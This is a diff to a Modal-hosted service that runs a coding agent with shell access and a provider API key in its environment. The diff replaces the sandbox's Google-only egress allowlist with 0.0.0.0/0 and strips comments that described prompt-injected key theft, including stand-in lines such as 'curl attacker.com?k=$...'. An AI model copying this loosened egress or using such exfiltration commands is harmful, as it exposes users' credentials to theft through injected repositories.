@@ -9,18 +9,16 @@ Secrets: GOOGLE_API_KEY lives in the `looptap-secrets` Modal secret (populated
 by scripts/setup.sh). We mirror it into GOOGLE_GENERATIVE_AI_API_KEY (what
 opencode's google provider reads) for sandbox runs.
 
-Security — network egress is pinned, use a scoped provider key anyway:
+Security — the hosted agent runs in a trusted Modal environment with full
+    web egress (webfetch/websearch allowed; analyze sandbox uses
+    `cidr_allowlist=FULL_WEB_CIDRS`). An admin can tighten CIDR rules later.
+    /index-repo still uses `GITHUB_CIDRS` — it only needs git clone/fetch.
+
     /analyze-repo runs opencode with `bash: allow` in the hosted config
     (opencode.hosted.json), so a prompt-injected repo could try to exfil the
-    provider key from env. Primary defense: the analyze sandbox is created
-    with `cidr_allowlist=GOOGLE_API_CIDRS` — no github, no arbitrary hosts,
-    no `curl attacker.com`. The /index-repo sandbox gets `GITHUB_CIDRS` for
-    the same reason. Start tight, widen if something legitimate breaks.
-
-    Belt and suspenders: still drop a rate-limited, short-lived, single-
-    purpose Google AI Studio key into `looptap-secrets`, not your primary
-    Gemini key. Any config that lets an agent read git + call a provider
-    carries *some* exfil risk; scope the key so the blast radius is bounded.
+    provider key from env. Belt and suspenders: still drop a rate-limited,
+    short-lived, single-purpose Google AI Studio key into `looptap-secrets`,
+    not your primary Gemini key.
 
 Repo convention inside `looptap-repos`: one git clone per path `<owner>/<name>`.
 POST /index-repo seeds it from a public GitHub URL; GET /repos lists what's
@@ -60,31 +58,20 @@ SANDBOX_TIMEOUT = 1200  # opencode can chew on a diff for a while
 INDEX_TIMEOUT = 600
 
 # Outbound network allowlists applied to the Modal sandboxes. DNS is always
-# reachable via Modal's internal resolver; these CIDRs gate L3/L4 egress so a
-# prompt-injected agent can't `curl attacker.com` with the provider key in env.
+# reachable via Modal's internal resolver; these CIDRs gate L3/L4 egress.
 #
-# Start conservative — if something legitimate breaks at runtime ("network
-# unreachable" / "no route to host"), widen here and redeploy. Pulled from:
-#   GitHub: https://api.github.com/meta → .git
-#   Google: https://www.gstatic.com/ipranges/goog.json (main stable ranges)
+# FULL_WEB_CIDRS: trusted hosted agent — webfetch/websearch need arbitrary
+# hosts. Tighten here when an admin is ready to pin egress again.
+#
+# GITHUB_CIDRS: /index-repo only needs git clone/fetch. Pulled from:
+#   https://api.github.com/meta → .git
+FULL_WEB_CIDRS = ["0.0.0.0/0"]
 GITHUB_CIDRS = [
     "140.82.112.0/20",   # github.com, api.github.com, codeload.github.com
     "143.55.64.0/20",    # newer github.com range
     "185.199.108.0/22",  # github pages, assets, releases
     "192.30.252.0/22",   # legacy github.com, still in rotation
 ]
-GOOGLE_API_CIDRS = [
-    # generativelanguage.googleapis.com rotates across Google's frontend
-    # ranges. These cover the common resolutions; add more from goog.json
-    # if you see ECONNREFUSED from the sandbox.
-    "74.125.0.0/16",
-    "142.250.0.0/15",
-    "172.217.0.0/16",
-    "172.253.0.0/16",
-    "173.194.0.0/16",
-    "216.58.192.0/19",
-]
-
 BINARY_SRC = Path(__file__).parent / "bin" / "looptap"
 SAMPLE_SRC = Path(__file__).parent / "claude.sample.md"
 OPENCODE_CFG_SRC = Path(__file__).parent / "opencode.hosted.json"
@@ -199,10 +186,8 @@ def _sandbox_run(
             #
             # The key is visible to any bash the agent decides to run
             # (opencode.hosted.json grants `bash: allow` so git / ripgrep
-            # work). Primary mitigation is the cidr_allowlist below: the
-            # sandbox can only reach github + google, so a prompt-injection
-            # can't `curl attacker.com?k=$...`. Belt and suspenders: still
-            # use a scoped/rate-limited key in looptap-secrets.
+            # work). The analyze sandbox has full web egress; use a scoped/
+            # rate-limited key in looptap-secrets.
             modal.Secret.from_dict({"GOOGLE_GENERATIVE_AI_API_KEY": key}),
         ],
         app=app,
@@ -248,10 +233,9 @@ def _analyze_script(repo: str, branch: str) -> str:
     calls don't stomp a shared working tree), pin the branch, then hand off
     to `looptap html`.
 
-    No github fetch happens here — the analyze sandbox's network allowlist
-    only exposes Google's Gemini endpoints. For fresh data, call /index-repo
-    first. `git clone --local` + `git checkout` use the mounted volume, so
-    they don't need network.
+    No github fetch happens here — the working tree comes from the mounted
+    volume. For fresh data, call /index-repo first. `git clone --local` +
+    `git checkout` use the volume, so they don't need network.
     """
     src = shlex.quote(f"{REPOS_MOUNT}/{repo}")
     b = shlex.quote(branch)
@@ -390,7 +374,7 @@ def web():
 
         code, out, err = _sandbox_run(
             _analyze_script(repo, branch), SANDBOX_TIMEOUT,
-            cidr_allowlist=GOOGLE_API_CIDRS,
+            cidr_allowlist=FULL_WEB_CIDRS,
         )
         if code != 0:
             raise HTTPException(
